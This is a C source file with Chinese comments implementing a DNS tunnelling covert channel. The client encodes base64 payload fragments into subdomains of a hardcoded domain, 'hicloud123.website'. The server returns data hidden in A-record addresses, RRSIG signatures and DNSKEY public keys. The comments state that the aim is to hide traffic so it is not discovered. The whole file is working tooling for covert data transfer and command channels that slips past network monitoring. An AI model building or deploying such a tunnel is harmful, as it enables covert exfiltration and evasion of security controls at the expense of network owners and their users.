#include "dns.h"
#include "base64.h"
#include "util.h"
#include <memory.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
/* 设计思想：为了更方便隐藏流量，不被发现，采用更隐秘的Resource Record
https://www.cloudshark.org/captures/79e23786259b
client -> server: query A, accept DNSSEC security RRs
server -> client: answer with RRSIG RR，signature 可用来传输数据
另一种：
client -> server: query DNSKEY, accept DNSSEC security RRs
server -> client: answer DNSKEY, publickey 可用来传输数据
 */

char g_baseDomain[255] = ".1.hicloud123.website";
short g_seq_number = 0;

/*
**从www.baidu.com转换到3www5baidu3com
**返回值 格式后字符串长度，不包含0
*/
static int formatDomainName(const char* in, char* out) 
{
    char count = 0;
    int num_offset = 0;
    for(int i = 0; in[i] != 0; ++i)
    {
        if (in[i] == '.')
        {
            out[num_offset] = count;
            num_offset += count + 1;
            count = 0;
        }
        else
        {
            out[num_offset + 1 + count] = in[i];
            ++ count;
        }
    }
    out[num_offset] = count;
    return num_offset + count + 1;
}

/*
* client使用
* 如果使用域名上那几个字母传递数据，最大只能是255，效率非常低。
* ---[FAIL，转发时并不会附带此OPTION] 暂时决定使用EDNS[0] OPT RR中OPTION-PADDING TLV来传输数据。
* ---[FAIL, 一个DNS查询里只能有一个question]
* 数据加密后base64，作为hostname
* Each label can be up to 63 bytes long. The total length of a domain name cannot exceed 255 bytes, including the dots.
*/
static char * buildQuery(const char * payload, int len, int isLast, unsigned short * seqIdOut, int * outlen)
{
    /*
    DNS头:question n, addtional RR 1
    Query RR
        Domain Name
        QUESTION
    Addtional RR
    */
    int mallocLen = sizeof(struct DNS_HEADER);
    mallocLen += MAX_DOMAINNAME_BYTES + sizeof(struct QUESTION);
    mallocLen += sizeof(struct EDNS0_OPT_RR);
    //mallocLen += sizeof(struct EDNS0_OPT_RR_OPTION);
    //mallocLen += len;

    /* 按domainName最大进行malloc */
    char * out = (char *)malloc(mallocLen);

    struct DNS_HEADER * dns_head = (struct DNS_HEADER *)out;
    /*设置DNS报文首部*/
    unsigned short sid = 0;
    getRand(&sid, sizeof(sid));
    dns_head->id = htons(sid);//id随机
    dns_head->qr = 0; //查询
    dns_head->opcode = 0; //标准查询
    dns_head->aa = 0; //不授权回答
    dns_head->tc = 0; //不可截断
    dns_head->rd = 1; //期望递归
    dns_head->ra = 0; //不可用递归
    dns_head->z = 0; //必须为0
    dns_head->ad = 0;
    dns_head->cd = 0;
    dns_head->rcode = 0;//没有差错
    dns_head->q_count = htons(1); //1个问题
    dns_head->ans_count = 0; 
    dns_head->auth_count = 0;
    dns_head->add_count = htons(1); //1个addtional RR

    char * position = out + sizeof(struct DNS_HEADER);

    //会话及分片信息，是否最后一片
    struct FragmentCtrl fregHead;
    unsigned short seqId = g_seq_number < 0?g_seq_number=0:g_seq_number++;
    *seqIdOut = seqId;
    fregHead.seqId = seqId;
    fregHead.end = isLast == 1;

    char fragmentData[255];
    memcpy_s(fragmentData, sizeof(fragmentData), &fregHead, sizeof(fregHead));
    memcpy_s(fragmentData + sizeof(fregHead), sizeof(fragmentData)-sizeof(fregHead), payload, len);

    char tmp[255] = {0};
    base64_encode(fragmentData, len + sizeof(fregHead), tmp);
    strcat(tmp, g_baseDomain);
    /*设置query hostName*/
    int nameLen = formatDomainName(tmp, position);
    position[nameLen] = 0;
    position += nameLen + 1;//还有一个\0
    /*设置QUERY为A类型*/
    struct QUESTION * question = (struct QUESTION *)position;
    question->qclass = htons(1);//HOST IN
    if(!isLast)
    {
        question->qtype = htons(QUERY_A);//A
    }
    else
    {
        question->qtype = htons(QUERY_DNSKEY);
    }
    
    position += sizeof(struct QUESTION);

    /*设置addtional RR*/
    struct EDNS0_OPT_RR * opt = (struct EDNS0_OPT_RR *)position;
    opt->name[0] = 0;
    opt->type = htons(41);//OPT type
    opt->udp_size = htons(4096);
    opt->extendRTcode = 0;
    opt->ednsVersion = 0;
    opt->z_flag = htons(0x8000);
    opt->data_len = 0;
    position += sizeof(struct EDNS0_OPT_RR);
    
    //设置OPT RR中的OPTION, opt->data_len在后面赋值
    /*
    struct EDNS0_OPT_RR_OPTION * opt_option = (struct EDNS0_OPT_RR_OPTION *)position;
    opt_option->code = htons(3);//NSID
    unsigned short option_len = (unsigned short)len;
    opt_option->length = htons(option_len);
    memcpy(opt_option->data, payload, len);
    opt->data_len = htons(sizeof(struct EDNS0_OPT_RR_OPTION) + option_len);
    position += sizeof(struct EDNS0_OPT_RR_OPTION) + option_len;*/

    *outlen = position - out;
    
    return out;
}

/*
* client使用
* Each label can be up to 63 bytes long. The total length of a domain name cannot exceed 255 bytes, including the dots.
* 对报文分片，每一个分片都是一个query
*/
struct QueryPkg * buildQuerys(const char * payload, int len, int * pkgNum)
{
    #define MAX_LABEL_BYTES 63
    #define MAX_PAYLOAD_SIZE_PER_QUERY (BASE64_DECODE_OUT_SIZE(MAX_LABEL_BYTES) - sizeof(struct FragmentCtrl))
    /* 把每个分片都作为一个query */
    int split_num = len / MAX_PAYLOAD_SIZE_PER_QUERY;
    int restBytes = len % MAX_PAYLOAD_SIZE_PER_QUERY;
    *pkgNum = split_num + 1;
    struct QueryPkg * pkgs = (struct QueryPkg *)malloc(sizeof(struct QueryPkg)*(split_num + 1));
    for (int i = 0; i < split_num + 1; i++)
    {
        const char * p = payload + i*MAX_PAYLOAD_SIZE_PER_QUERY;
        int outlen = 0;
        char * out = 0;
        unsigned short seqId = 0;
        if(i != split_num)
        {
            out = buildQuery(p, MAX_PAYLOAD_SIZE_PER_QUERY, 0, &seqId, &outlen);
        }
        else
        {
            out = buildQuery(p, restBytes, 1, &seqId, &outlen);
        }
        
        pkgs[i].seqId = seqId;
        pkgs[i].payload = out;
        pkgs[i].len = outlen;
    }
    return pkgs;
}

/*
* server使用
* 对查询分片进行处理，获得报文，写入out最大也只有45字节
*/
int processQuery(const char * payload, int len, struct FragmentCtrl * frag, char * out, int outsize)
{
    struct DNS_HEADER * head = (struct DNS_HEADER *)payload;
    //有时这个附加选项会被删掉，因此不强求附加选项
    if (ntohs(head->q_count) == 1)
    {
        char tmp[255] = {0};
        char * p = (char *)(head + 1);
        for(char i = 0; i < p[0]; ++i)
        {
            tmp[i] = p[i+1];
        }

        char out1[255]={0};
        int len = base64_decode(tmp, p[0], out1);
        if (len <= 0)//解密失败，有时会发来ntp之类的数据
        {
            return -1;
        }
        
        *frag = *(struct FragmentCtrl *)(out1);
        memcpy_s(out, outsize, out1 + sizeof(*frag), len - sizeof(*frag));
        return len - sizeof(*frag);
    }
    return -1;
}

/*
* server使用
* A记录响应包，携带4字节数据
*/
char * buildResponseA(const char * query, int len, unsigned int * value, int * outlen)
{
    *outlen = 0;
    if (len < sizeof(struct DNS_HEADER))
    {
        return 0;
    }
    
    struct DNS_HEADER * queryDnsHead = (struct DNS_HEADER *)query;
    int domainNameLen = strlen((char *)(queryDnsHead + 1)) + 1;
    int mallocLen = sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    if (len < mallocLen)
    {
        return 0;
    }
    
    //使用域名压缩，Answer中的域名只需要2字节
    mallocLen += 2;
    mallocLen += sizeof(struct R_DATA);
    mallocLen += sizeof(int);//ipv4

    char * out = (char *)malloc(mallocLen);
    memcpy_s(out, mallocLen, query, sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION));
    struct DNS_HEADER * rspDnsHead = (struct DNS_HEADER *)out;
    rspDnsHead->ans_count = htons(1);
    rspDnsHead->add_count = 0;
    rspDnsHead->qr = 1;
    char * p = out + sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    
    unsigned short * offset = (unsigned short *)p;
    *offset = htons(0xC000 | sizeof(struct DNS_HEADER));
    p += sizeof(short);

    struct R_DATA * answer = (struct R_DATA *)p;
    answer->data_len = htons(4);//ipv4
    answer->ttl = htonl(5);
    answer->type = htons(1);
    answer->_class = htons(1);
    unsigned int * ip = (unsigned int *)answer->rdata;
    
    *ip = htonl(*value);

    *outlen = mallocLen;

    return out;
}

char * buildRRSIGResponse(const char * query, int len, const char * payload, int payloadlen, int * outlen)
{
    *outlen = 0;
    if (len < sizeof(struct DNS_HEADER))
    {
        return 0;
    }
    
    struct DNS_HEADER * queryDnsHead = (struct DNS_HEADER *)query;
    int domainNameLen = strlen((char *)(queryDnsHead + 1)) + 1;
    int mallocLen = sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    if (len < mallocLen)
    {
        return 0;
    }
    
    //使用域名压缩，Answer中的域名只需要2字节
    mallocLen += 2;
    mallocLen += sizeof(struct R_DATA);
    mallocLen += sizeof(struct RRSIG_ANSWER_PAYLOAD);
    mallocLen += MAX_DOMAINNAME_BYTES;//signature name
    mallocLen += payloadlen;
    mallocLen += sizeof(struct EDNS0_OPT_RR);

    char * out = (char *)malloc(mallocLen);
    memcpy_s(out, mallocLen, query, sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION));
    struct DNS_HEADER * rspDnsHead = (struct DNS_HEADER *)out;
    rspDnsHead->ans_count = htons(2);
    rspDnsHead->add_count = htons(1);
    rspDnsHead->qr = 1;
    char * p = out + sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    
    unsigned short * offset = (unsigned short *)p;
    *offset = htons(0xC000 | sizeof(struct DNS_HEADER));
    p += sizeof(short);

    struct R_DATA * answer = (struct R_DATA *)p;
    //answer->data_len = htons(sizeof(struct RRSIG_ANSWER_PAYLOAD) + payloadlen);
    answer->ttl = htonl(5);
    answer->type = htons(46);
    answer->_class = htons(1);
    p += sizeof(*answer);
    struct RRSIG_ANSWER_PAYLOAD * rrsig_payload = ( struct RRSIG_ANSWER_PAYLOAD *)answer->rdata;
    rrsig_payload->algorithm = 5;
    rrsig_payload->cover_type = htons(1);
    rrsig_payload->labels = 4;
    time_t now = time(0);
    rrsig_payload->signature_expire = htonl(now + 365*24*3600);
    rrsig_payload->signature_inception = htonl(now);
    getRand(&rrsig_payload->keyTag, 2);
    int signatureNameLen = formatDomainName(g_baseDomain + 3, rrsig_payload->signame);
    p += sizeof(*rrsig_payload) + signatureNameLen;
    memcpy_s(p, mallocLen - (p - out), payload, payloadlen);
    p += payloadlen;

    struct EDNS0_OPT_RR * opt = (struct EDNS0_OPT_RR *)p;
    opt->name[0] = 0;
    opt->type = htons(41);//OPT type
    opt->udp_size = htons(4096);
    opt->extendRTcode = 0;
    opt->ednsVersion = 0;
    opt->z_flag = htons(0x8000);
    opt->data_len = 0;
    p += sizeof(struct EDNS0_OPT_RR);

    *outlen = mallocLen;

    return out;
}

/* payload中应该要包含应答信息 */
char * buildResponseDnskey(const char * query, int len, const char * payload, int payloadlen, int * outlen)
{
    *outlen = 0;
    if (len < sizeof(struct DNS_HEADER))
    {
        return 0;
    }
    
    struct DNS_HEADER * queryDnsHead = (struct DNS_HEADER *)query;
    int domainNameLen = strlen((char *)(queryDnsHead + 1)) + 1;
    int mallocLen = sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    if (len < mallocLen)
    {
        return 0;
    }
    
    //使用域名压缩，Answer中的域名只需要2字节
    mallocLen += 2;
    mallocLen += sizeof(struct R_DATA);
    mallocLen += sizeof(struct DNSKEY_ANSWER_PAYLOAD);
    mallocLen += payloadlen;
    mallocLen += sizeof(struct EDNS0_OPT_RR);

    char * out = (char *)malloc(mallocLen);
    memcpy_s(out, mallocLen, query, sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION));
    struct DNS_HEADER * rspDnsHead = (struct DNS_HEADER *)out;
    rspDnsHead->ans_count = htons(1);
    rspDnsHead->add_count = htons(1);
    rspDnsHead->qr = 1;
    char * p = out + sizeof(struct DNS_HEADER) + domainNameLen + sizeof(struct QUESTION);
    
    unsigned short * offset = (unsigned short *)p;
    *offset = htons(0xC000 | sizeof(struct DNS_HEADER));
    p += sizeof(short);

    struct R_DATA * answer = (struct R_DATA *)p;
    answer->data_len = htons(sizeof(struct DNSKEY_ANSWER_PAYLOAD) + payloadlen);
    answer->ttl = htonl(5);
    answer->type = htons(48);
    answer->_class = htons(1);
    p += sizeof(*answer);
    struct DNSKEY_ANSWER_PAYLOAD * answer_payload = ( struct DNSKEY_ANSWER_PAYLOAD *)answer->rdata;
    answer_payload->algorithm = 7;
    answer_payload->protocol = 3;
    answer_payload->flags = htons(0x0100);
    p += sizeof(*answer_payload);
    memcpy_s(answer_payload->publicKey, mallocLen - (p - out), payload, payloadlen);
    p += payloadlen;

    struct EDNS0_OPT_RR * opt = (struct EDNS0_OPT_RR *)p;
    opt->name[0] = 0;
    opt->type = htons(41);//OPT type
    opt->udp_size = htons(4096);
    opt->extendRTcode = 0;
    opt->ednsVersion = 0;
    opt->z_flag = htons(0x8000);
    opt->data_len = 0;
    p += sizeof(struct EDNS0_OPT_RR);

    *outlen = mallocLen;

    return out;
}


/*
* client使用
* 解析响应包
* 返回值是入参的偏移
*/
//TODO 多answer合并
char * parseResponse(const char * packet, int len, int * outlen)
{
    if (len <= sizeof(struct DNS_HEADER))
    {
        return 0;
    }
    
    struct DNS_HEADER * head = (struct DNS_HEADER *)packet;
    if (head->qr == 1 && head->rcode == 0)
    {
        char tmp[255] = {0};
        char * p = (char *)(head + 1);
        p += strlen(p) + 1;//query中的域名
        p += sizeof(struct QUESTION);

        unsigned char c = p[0];
        //answer中是否是压缩域名
        if ((c & 0xc0) == 0xc0)
        {
            p += 2;//这里是2字节的偏移
        }
        else
        {
            p += strlen(p) + 1;//answer中的域名
        }
        
        if (p - packet >= len)
        {
            return 0;
        }
        
        struct R_DATA * answer = (struct R_DATA *)p;
        unsigned short answer_type = ntohs(answer->type);
        if(answer_type == QUERY_A)
        {
            *outlen = ntohs(answer->data_len);
            return answer->rdata;
        }
        else if (answer_type == QUERY_DNSKEY)
        {
            struct DNSKEY_ANSWER_PAYLOAD * dnskey = (struct DNSKEY_ANSWER_PAYLOAD *)answer->rdata;
            char alg = dnskey->algorithm;
            unsigned short flags = ntohs(dnskey->flags);  
            char protocol = dnskey->protocol;
            if (protocol == 3 && flags == 0x100 && alg == 7)
            {
                *outlen = ntohs(answer->data_len) - sizeof(*dnskey);
                return dnskey->publicKey;
            }
        }
        
    }
    return 0;
}

